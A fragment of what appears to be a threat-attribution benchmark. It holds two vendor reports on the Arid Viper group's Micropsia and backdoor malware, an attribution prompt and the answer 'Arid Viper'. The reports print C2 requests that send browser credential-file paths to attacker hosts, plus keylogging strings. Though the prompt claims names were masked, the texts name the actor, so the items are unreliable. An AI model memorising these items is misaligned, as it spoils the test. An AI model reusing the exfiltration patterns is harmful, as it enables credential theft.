        "url": "https://blog.talosintelligence.com/arid-viper-targets-palestine/",
        "Text": "rid Viper APT targets Palestine with new wave of politically themed phishing attacks, malware\nExecutive summary\nCisco Talos has identified a new wave of what is believed to be an ongoing campaign using the Delphi malware since 2017. Talos believes with high confidence that this is the work of the Arid Viper threat actor. This is a group believed to be based out of Gaza that's known to target organizations all over the world. The actor uses the Micropsia implant in the most recent wave that started around October 2021.\nThis actor uses their Delphi-based Micropsia implant to target Palestinian individuals and organizations, using politically themed file names and decoy documents. The most recent wave uses content originally published on the Turkish state-run news agency Anadolu and on the Palestinian MA'AN development center to target activists and Palestinian institutions. The tactics, techniques and procedures (TTPs) used in the most recent samples found by Talos lead us to believe this is a campaign linked to the previous campaign we reported on in 2017. Meta exposed this actor in an April 2021 report that focused mainly on mobile targeting operations. However, that did not stop the group, as they've continued to target Windows-based systems. Although this group hasn't technologically evolved, it has the motivation and means to operate longstanding campaigns against the same targets. This level of motivation makes them particularly dangerous to organizations that may come into their crosshairs. An in-depth defense using protections against the several layers of their infection chain is the best strategy to defend against this kind of threat. This should include email security to detect and prevent their most common initial attack vector, along with Cisco Secure Endpoint if the implant is successfully delivered using novel attack vectors. On the network side, Cisco Secure Firewall and Umbrella can be used to detect command and control (C2) communications performed with new versions and variants of their implants.\nArid Viper threat actor\nArid Viper, also known as Desert Falcon or APT C-23, was first exposed in 2015. This threat actor's main motivation is espionage and information theft, and has been attributed to malicious operators politically motivated towards the liberation of Palestine. Its victimology is dispersed all over the world, including Palestinian organizations and individuals. Arid Viper is not a technically evolved actor, however, it is known to target mobile and desktop platforms, including Apple iOS. Their toolkit consists of Delphi packers and compilers around their staple malware, Micropsia. This implant has also been ported to other platforms with versions based on Python and an Android version.\nCampaign\nTalos has identified new waves of this campaign against Palestinian individuals and organizations. It uses the same TTPs that we published in our first report on this actor back in 2017. The image below shows an example of a lure used in 2019 — while the file name refers to an annual report from 2018, the contents actually mention 2014 and 2015.\n\nExample of the decoy document from 2019.\nThe table below shows a small chronology of malicious implants masquerading as documents of interest being created with the same themes, which we associate with high confidence to the same ongoing campaign.\n\nThe use of politically themed lures reduced during 2018 and 2019, but we observed a definite increase in their usage in 2020 and 2021. Talos also observed other themes being used by this group (to deliver Micropsia) during 2018 and 2019 and into 2020/21, but they were not considered as part of this campaign in analysis and are beyond the scope of this research.\nMost recent decoys\nThe politically motivated content in the decoy documents, along with the use of the Arabic language, point to the victims being Palestinian individuals and organizations.\nThe most recent decoy document from September 2021 contains an article about the reunification of Palestinian families, originally published by the Anadolu Agency on Sept. 3, 2021.\n\nDecoy document containing text on Palestinian reunification.\nAnother decoy, also from September 2021, consists of an article on social and economically sustainable development in Palestine by the MA'AN development center — a Palestinian development and training institution aimed at community development.\n\nDecoy document containing an article on Palestinian sustainable development.\nAnother decoy from July 2021 consisted of a patient's report containing affidavits from the State of Palestine's Ministry of Health. During March and February 2021, we observed the use of politically themed decoys. One of these decoys consisted of a list of questions from a Palestinian activist on the Presidential decree issued on Feb. 20, 2021, ordering the respect of freedom of expression ahead of legislative elections in May.\n\nDecoy containing a list of questions from a Palestinian activist.\nDeployment\nDuring this investigation, Talos could not find any email or social media posts that were somehow linked to the Micropsia implants. However, we found the implants and compressed files containing the implants. This follows the same pattern that we described in our 2017 post about this actor. It is highly likely that the threat actor has continued to use the email vector to deliver their lures and implants.\nImplant analysis\nThe implant used to target Palestinian entities consists of Delphi-based versions of Micropsia. This implant consists of a Delphi form with four buttons and four timers implemented to carry out different malicious activities described below.\n\nForm1 containing the four timers.\n\nForm1 contents\nAll the malicious functionalities are implemented through the timers configured in the implant.\nDeploying the decoy document\nOne of these timers is responsible for extracting the decoy document and saving it to the %TEMP% folder and then displaying it via ShellExecute:\n\nDecoy document extracted and displayed to the target.\nNow, if the implant is started with the \"-start\" command-line switch, it will skip the process for dropping and displaying the decoy document and jump straight to its RAT functionalities.\nEstablishing persistence\nAnother timer is used to establish persistence for the implant on the endpoint.\nHere, the implant will establish persistence by obtaining its current command line, which is then used to create a shortcut for itself in the %TEMP% directory. The shortcut to run the implant contains the \"-start\" switch (used to skip the displaying of the decoy document). This shortcut is then moved over to the currently logged-in user's Startup folder to complete persistence across reboots and re-logins.\nInformation Gathering\nThe remaining two timers will gather preliminary system information and activate the RAT capabilities of the implant.\nThe sequence of actions followed for gathering system information from the endpoint are as follows:\n1.\tGenerate a pc ID for the infected endpoint. Save this value into a data file, such as: \"%APPDATA%\\dsfjj45k.tmp\"\n2.\tGather the Computername and username from ENV. Concatenate the computername, username and pcid into format: <COMPNAME>_<username>_<pcid>\n3.\tGather installed AV information from the endpoint via \"winmgmts:\\localhost\root\\SecurityCenter2\" using query \"SELECT * FROM AntiVirusProduct\". From the AV information obtained, record the DisplayName.\n4.\tGet OS information specifically the installed product name.\n5.\tGet the current implant's command line and record it.\nAll this data gathered from the system is individually base64-encoded and assigned to HTTP form query variables with the following name-value pairs:\nvcqmxylcv= base64 encoded <COMPNAME>_<username>_<pcid>\nvcnwaapcv= base64 encoded AV Name list.\nvcllgracv= base64 encoded OS version string.\nvcwjlxycv= base64 encoded implant command line.\nvccodwfcv= base64 encoded hardcoded flag.\nThe data is then sent to the implant's C2 server via an HTTP POST request, which is fairly standard in Micropsia implants.\nRAT capabilities\nOnce the preliminary information has been sent, the implant now begins its remote access trojan (RAT) activity and waits for command codes from the C2 server.\nThe implant now uses two additional HTTP form variables to transmit the output of the commands executed on the endpoint:\nvcgqjdlrcv = hardcoded value 0.\nmugnaq = base64 encoded screenshot or command output.\nThe C2 issues distinct command codes to the implant to carry out various actions on the infected endpoint.\nThe commands follow the format: ;<cmd_code>;<base64_encoded_supporting_data>;\nThe above example would run the ipconfig command on the endpoint.\nThe command codes accepted by the implant are listed here:\nWe have observed implants using two distinct URLs to instrument communications with the C2, one for exfiltration of screenshots and the other for all the other RAT commands.\nFor example one of the implants used a distinct URL for screenshots:\nhxxp[s]://deangelomcnay[.]news/qWIlIdKf2buIH0k/GbrHoIfRqtE69hH/ZCgbo9EVhYMA8PX\nWhile another URL was used for all other commands:\nhxxp[s]://deangelomcnay[.]news/qWIlIdKf2buIH0k/GbrHoIfRqtE69hH/bu5EmpJE7DUfzZD\nConclusion\nSince its initial disclosure by Talos in 2017, this campaign from Arid Viper has become a long-standing offensive cyber attack spanning well into 2021.\nState-sponsored actors and privateer groups rely heavily on stealth in their operations. The public disclosures of campaigns and targeted attacks are usually followed by the actors taking down their infrastructure and revamping their implants to avoid discovery of their malicious assets.\nHowever, in the case of Arid Viper, the continued use of the same TTPs over the past four years indicates that the group doesn't feel affected by the public exposure of its campaigns and implants, and continues to operate business as usual. This complete lack of deterrence makes them a dangerous group once they decide to target an organization or individual.\nThe lack of change also points to a certain level of success with their current TTPs. The new campaign and accompanying versions of Arid Viper's Micropsia implant disclosed in this research by Talos brings the spotlight back to their politically themed campaign to remind potential victims that the group is still very active.\nArid Viper is a prime example of groups that aren't very advanced technologically, however, with specific motivations, are becoming more dangerous as they evolve over time and test their tools and procedures on their targets. Implants such as Micropsia come in various forms such as Delphi, Python and Android. Such RATs proliferated and operated by a highly motivated threat actor who refuses to back down, consist of a variety of functionalities and are constantly evolving. These RATs can be used to establish long-term access into victim environments and additionally deploy more malware purposed for espionage and stealing information and credentials.\nIn-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention. However, this should always be complemented by a good incident response plan which has been not only tested with tabletop exercises, but also reviewed and improved every time it is put to the test on real-world engagements.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Arid Viper"
    },
    {
        "url": "https://www.proofpoint.com/us/threat-insight/post/Operation-Arid-Viper-Slithers-Back-Into-View",
        "Text": "Operation Arid Viper Slithers Back into View\nSHARE WITH YOUR NETWORK!\nEarlier this year, researchers published analyses of targeted attack known as Operation Arid Viper [1] (aka Desert Falcons [2], aka DHS) directed primarily at organizations in the Middle East. Delivering a backdoor and spyware, this campaign was designed to steal information from infected systems using a malware client capable of filtering out “uninteresting” files, and spread primarily via a targeted phishing email usually promising a pornographic video.\nThe infection chain described in the initial analyses was fairly straightforward: To access the video content, the recipient had to open an attached RAR archive file – or less frequently, click a link to a RAR – that extracted an SCR (Windows screensaver) file, which in turn drops two files: a malicious EXE with the name of a legitimate file (such as “skype.exe”), and a video format file, usually FLV or MPG.\nDespite the apparent severity and extent of this threat, little has been written about it in the intervening months, and the operation appeared to be dormant. However, Proofpoint researchers recently intercepted and analyzed phishing emails distributing Arid Viper malware payloads with some noteworthy updates.\nAs with the originally documented examples, these messages were part of narrow campaigns targeting specific industry verticals: telecoms, high tech, and business services, primarily in Israel.\nIn these samples, the spear-phishing email contained a link to a RAR file hosted on MediaFire – no attachments were observed. Instead of a pornographic video, the actors showed a change in TTP by using as lure a video of a fiery automobile accident.\nהתאונה בכביש // Road accident\nוידיו מזעזע דלפ תקשורת // And his shocking leaked to the media\nClicking the linked RAR brings up a prompt to download the file “this.morning.rar” to their computer. (Fig. 1)\nThe file “this.morning” is a RAR self-extracting (SFX) archive (cd89897a2b6946a332354e0609c0b8b4). Once downloaded, the user opens the RAR which extracts what appears to be a video file named “this.morning”.\nIn fact, double-clicking RAR SFX extracts and executes two files contained in this archive:\n•\tA non-malicious video file: this.morning.flv (41bf348254b921bbd21350a70f843683)\n•\tThe malware payload: chrome.exe (2ae0f580728c43b3a3888dfbe76ad689)\nIn this regard, the infection chain is still similar to that described in the original Operation Arid Viper analysis, but with noticeable changes to the filenames and email lure, among others. The end user will see the promised video, while in the background the malicious “chrome.exe” begins is communication with the command and control (C2) server: in both cases the action is automatic and initiated simply by double-clicking the self-extracting the RAR SFX archive, with no further interaction by the end-user needed. The following is an example of the initial C2 beacon: \nGET /Sounds/sound_q.php?p=—[redacted]. HTTP/1.1\n\nAccept: text/*\n\nUser-Agent: AudioDrive\n\nAccept-Language: en-us\n\nContent-Type: application/x-www-form-urlencoded\n\nHost: oowdesign [.] com\n\nCache-Control: no-cache\nAnd this is an example of the C2 server response:\nHTTP/1.1 200 OK\n\nServer: nginx\n\nDate: Wed, 26 Aug 2015 14:11:52 GMT\n\nContent-Type: text/html\n\nTransfer-Encoding: chunked\n\nConnection: keep-alive\n\nVary: Accept-Encoding\n\nX-Powered-By: PHP/5.3.29\n\n\na\n\n\n.\n\nyes;\n\n0\nThe malware payload still uses the type of hard drive and a set of numbers as a unique identifier; for example: VMware-VMwareVirtualSSCSIDisk—[redacted].. Moreover, the malware compile time appears to be quite recent. (Fig. 2)\nThe Trojan continues to exhibit its behavior of downloading an update following the first C2 communication, and in this case Proofpoint researchers succeeded in patching the initial malware to obtain the second stage malware payload (3a401a679d147b070eb8ccae5df3dc43), which allowed us to observe more activities.\nPreviously described as the Operation Arid Viper backdoor, the second stage payload was observed in traffic to be obfuscated with standard base64-encoding. The second-stage backdoor has a compile date prior to the first stage malware by nearly a day. (Fig. 3)\nDuring the infection process, the Arid Viper malware makes multiple HTTP GET requests to register the client with the server and check for updates:\nGET /designs/new_user.php?s1=[---UID---]&s2=8 HTTP/1.1 àcall PHP script to login / register the infected machine\n\nGET /designs/is_ok.php?s1=[---UID---] HTTP/1.1 à call PHP script to perform a user check on the server side (server responds with “OK”)\n\nGET /designs/add_recoord.php?s1=[---UID---]&s2=8&s3=2[---Date---]&s4=msn à call PHP script to add a record to the server\n\nGET /designs/get_t.php?s1=[---UID---]&s2=[---Date---]\n\nGET /designs/add_t.php?s1=[---UID---]&s2=[---Date---]\n\nGET /designs/get_r.php?s1=[---UID---]\nIn addition, the backdoor POSTs data back to the server:\nPOST /designs/drive_update.php HTTP/1.1 à encrypted data wrapped in a custom base64 encoding is sent via HTTP POST to the C2 server\n\nUser-Agent: Realtek\n\nContent-Type: application/x-www-form-urlencoded\n\nHost: smilydesign [.] com\n\nContent-Length: 978\n\nPragma: no-cache\nThe Arid Viper backdoor also sends GETs to confirm the existence of interesting data / files, with the path and filenames included in the request. The following exchanges show the GET request (with filename and path in bold), and C2 server response (i.e., “OK”):\nGET /designs/send_request_r_data.php?s1=[redacted]&path=C:/Users/COMPUTER/AppData/Roaming/Mozilla/Firefox/Profiles/[redacted]..default/key3.db HTTP/1.1\n\nAccept: text/*\n\nUser-Agent: Realtek\n\nAccept-Language: en-us\n\nContent-Type: application/x-www-form-urlencoded\n\nHost: smilydesign.com\n\nCache-Control: no-cache\n\n\nHTTP/1.1 200 OK\n\nServer: nginx\n\nDate: Thu, 27 Aug 2015 11:48:19 GMT\n\nContent-Type: text/html\n\nContent-Length: 7\n\nConnection: keep-alive\n\nKeep-Alive: timeout=60\n\nX-Powered-By: PHP/5.3.10-1ubuntu3.17\n\nVary: Accept-Encoding\n\n\n\ndone\n\nGET /designs/send_request_r_data.php?s1=[redacted]&path=C:/Users/COMPUTER/AppData/Roaming/Mozilla/Firefox/Profiles/[redacted].default/logins.json HTTP/1.1\n\nAccept: text/*\n\nUser-Agent: Realtek\n\nAccept-Language: en-us\n\nContent-Type: application/x-www-form-urlencoded\n\nHost: smilydesign [.] com\n\nCache-Control: no-cache\n\n\nHTTP/1.1 200 OK\n\nServer: nginx\n\nDate: Thu, 27 Aug 2015 11:48:19 GMT\n\nContent-Type: text/html\n\nContent-Length: 7\n\nConnection: keep-alive\n\nKeep-Alive: timeout=60\n\nX-Powered-By: PHP/5.3.10-1ubuntu3.17\n\nVary: Accept-Encoding\n\n\ndone\nIn addition, analysis of the Arid Viper backdoor binary shows evidence of keylogging capabilities:\n00000006E2C4   00000046F2C4      0   [The Right KeyPressed]\n\n00000006E2F4   00000046F2F4      0   [The LeFT Key Pressed]\n\n00000006E324   00000046F324      0   [The Down Key Is Pressed]\n\n00000006E358   00000046F358      0   [The Up Key Is Pressed]\n\n00000006E388   00000046F388      0   [left alt+shift]\n\n00000006E3AC   00000046F3AC      0   [right alt+shift]\n\n00000006E3D0   00000046F3D0      0   [Caps Lock]\n\n00000006E3E8   00000046F3E8      0   [Tab Pressed]\n\n00000006E404   00000046F404      0   [Back space Pressed...]\nAs well as the ability to steal browser data:\n00000006DC30   00000046EC30      0   \\logins.json\n\n00000006DC40   00000046EC40      0   \\key3.db\n\n00000006DC4C   00000046EC4C      0   \\\\Mozilla\\Firefox\\Profiles\\\n\n00000006DC68   00000046EC68      0   .default\n\n00000006DC74   00000046EC74      0   \\Mozilla\\Firefox\\Profiles\\*.*\n\n00000006DC94   00000046EC94      0   \\Google\\Chrome\\User Data\\Default\\Login Data\n\n00000006DCC0   00000046ECC0      0   <i l=\"%ws\" u=\"%ws\" p=\"%ws/>\n\n00000006DCE9   00000046ECE9      0  \n\nUsername: %ws\n\n00000006DCF8   00000046ECF8      0  \n\nPassword: %ws\n\n00000006DD0C   00000046ED0C      0   Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2\nThe Arid Viper backdoor encrypts data to be exfiltrated in order to avoid detection, and after additional analysis Proofpoint researchers succeeded in determining its encryption routine.\nData Exfiltration\nThe updated data exfiltration of the new Arid Viper backdoor functions similarly to previously documented versions. The table below lists some of the different functionalities paired with the actor-assigned indicator, which can be seen in both the HTTP client body along with exfiltrated data as well as in the URI once exfiltration is complete. (Table 1)\nCaptured C2 traffic provides an example of the network traffic seen during a msn data exfiltration. (Fig. 4)\nAlthough the data that is exfiltrated and the manner in which it is gathered remain largely the same as in previously documented versions, the final result that is transmitted to an attacker-controlled server has changed significantly. In an older version of this backdoor (md5: aefea9d795624da16d878dc9bb81bf87), exfiltrated data was simply base64-encoded using a slightly modified base64 alphabet (“-” instead of “+”). In the newer version, prior to base64 encoding the exfiltrated data is first encrypted with AES-256 in CBC mode. The encryption process is depicted in Figure 5 and explained below.\nTo generate the key/IV pair, first the malware randomly generates 60 bytes of data. From this, the first 32-bytes are used for the key, the next byte is skipped, and the following 16 bytes are used for the IV. After encryption, the key, separator byte, IV, leftover bytes and padding are then encoded into a 512-byte block of data and prepended to the encrypted data. The encoded key/IV and encrypted data are then base64-encoded using the same modified alphabet. Just like in the older version, this data is then appended to the final variable in the POST’s HTTP client body and sent to an attacker-controlled server.\nReinventing the wheel\nNumerous examples over the years have served to remind us that designing your own cryptography implementation is difficult and usually ill-advised. The authors of the updated Arid Viper backdoor seem to have overlooked this lesson for, although certain measures have been taken to protect the generated secret keys and IVs, their implementation is susceptible to a brute force attack, often capable of finding the correct key/IV combination in less than one second. Cracking the encryption scheme applied to the traffic in Figure 4 reveals the following decrypted cleartext. (Fig. 6)\nDetermining the encryption scheme that is applied to the updated Arid Viper backdoor’s exfiltrated data enables us to better detect C2 communication while also rapidly determining the extent and impact of the data breach carried out by the malware client.\nConclusion\nIn summary, this update to Operation Arid Viper demonstrates that despite its relatively low profile since February the Arid Viper / Desert Falcons threat still has teeth and remains a risk for organizations in Israel and elsewhere. While the overall attack profile observed in recent examples remains similar to the originally documented campaigns, the recent campaigns exhibit several important updates: \n•\tUse of links instead of attachments\n•\tNew lures: still using pornographic video but most recent detections also included lures for auto accident footage\n•\tNew executable name: originally reported using “skype.exe” (and variations on “skype”), the recent samples used “chrome.exe”\n•\tNew C2 domains\n•\tAdded encryption for exfiltrated data\n \nThe return of Operation Arid Viper shows that targeted attacks can remain a threat even – and especially – when they are no longer in the headlines,\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Arid Viper"
    }
]